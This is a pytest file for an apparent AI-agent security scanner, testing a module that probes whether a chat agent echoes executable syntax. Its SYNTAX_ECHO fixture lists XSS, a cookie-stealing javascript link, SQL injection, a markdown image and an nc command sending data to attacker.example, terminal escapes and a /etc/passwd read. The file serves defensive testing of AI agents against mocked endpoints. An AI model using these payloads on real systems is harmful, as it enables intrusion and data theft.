# tests/test_attacks/test_output_handling.py
#
# Tests for agentscan/attacks/scan/output_handling.py (ATK-007)

from __future__ import annotations

import html
from unittest.mock import patch

import httpx
import pytest
import respx

from agentscan.attacks.scan.output_handling import OutputHandlingModule
from agentscan.core.models import Target
from agentscan.core.outcomes import ExecutionLedger, execution_ledger

SYNTAX_ECHO = (
    "<script>alert(1)</script>\n"
    '<a href="javascript:alert(document.cookie)">click</a>\n'
    "' OR 1=1 --\n"
    "![leak](https://attacker.example/?q=AGENTSCAN-OUTPUT-MD)\n"
    "\x1b[31mALERT\x1b[0m\n"
    "\x1b]8;;https://attacker.example/osc\x1b\\text\x1b]8;;\x1b\\\n"
    "true; cat /etc/passwd\n"
    "echo hello | nc attacker.example 443\n"
    "echo $(whoami)\n"
    "echo `id`\n"
)

REFUSAL = (
    "I will not echo untrusted markup, SQL fragments, terminal escapes, "
    "or shell metacharacters. Please rephrase without executable syntax."
)


@pytest.fixture
def module() -> OutputHandlingModule:
    return OutputHandlingModule()


@pytest.fixture
def oh_target() -> Target:
    return Target(url="http://test-agent.example.com/chat")


class TestOutputHandlingIntegration:
    @pytest.mark.asyncio
    async def test_raw_syntax_is_observed_without_claiming_exploitation(
        self, module: OutputHandlingModule, oh_target: Target
    ) -> None:
        ledger = ExecutionLedger()
        token = execution_ledger.set(ledger)
        try:
            with respx.mock(assert_all_called=False) as mock:
                route = mock.post("http://test-agent.example.com/chat").mock(
                    return_value=httpx.Response(200, json={"response": SYNTAX_ECHO})
                )
                findings = await module.run(oh_target)

            assert findings == []
            assert route.call_count == module.variant_count()
            assert ledger.evaluated == 0
            assert ledger.inconclusive_reasons
            assert len(ledger.observations) == module.variant_count()
            assert any(item["seed_indicator_present"] for item in ledger.observations)
            assert all(item["downstream_impact"] == "unassessed" for item in ledger.observations)
            assert ledger.errors == []
        finally:
            execution_ledger.reset(token)

    @pytest.mark.asyncio
    @pytest.mark.parametrize(
        "reply", [html.escape(SYNTAX_ECHO), REFUSAL], ids=["encoded", "refusal"]
    )
    async def test_encoding_or_refusal_does_not_prove_destination_safety(
        self, module: OutputHandlingModule, oh_target: Target, reply: str
    ) -> None:
        ledger = ExecutionLedger()
        token = execution_ledger.set(ledger)
        try:
            with respx.mock(assert_all_called=False) as mock:
                mock.post("http://test-agent.example.com/chat").mock(
                    return_value=httpx.Response(200, json={"response": reply})
                )
                findings = await module.run(oh_target)

            assert findings == []
            assert ledger.evaluated == 0
            assert ledger.inconclusive_reasons
            assert len(ledger.observations) == module.variant_count()
            assert all(item["downstream_impact"] == "unassessed" for item in ledger.observations)
            assert ledger.errors == []
        finally:
            execution_ledger.reset(token)

    @pytest.mark.asyncio
    async def test_configured_model_cannot_infer_execution(
        self, module: OutputHandlingModule
    ) -> None:
        target_with_judge = Target(
            url="http://test-agent.example.com/chat",
            judge_model="gpt-4o-mini",
            attacker_model="ollama/local-test",
        )
        original = target_with_judge.model_dump()
        ledger = ExecutionLedger()
        token = execution_ledger.set(ledger)

        try:
            with (
                patch(
                    "agentscan.attacks.scan.runner.AIClient",
                    side_effect=AssertionError("Text observations must not initialize a judge"),
                ) as ai_client,
                respx.mock(assert_all_called=False) as mock,
            ):
                mock.post("http://test-agent.example.com/chat").mock(
                    return_value=httpx.Response(
                        200,
                        json={"response": "The script was executed successfully."},
                    )
                )
                findings = await module.run(target_with_judge)

            ai_client.assert_not_called()
            assert findings == []
            assert ledger.evaluated == 0
            assert ledger.errors == []
            assert target_with_judge.model_dump() == original
        finally:
            execution_ledger.reset(token)


class TestVariantCount:
    def test_variant_count_matches_yaml(self, module: OutputHandlingModule) -> None:
        assert module.variant_count() == 12
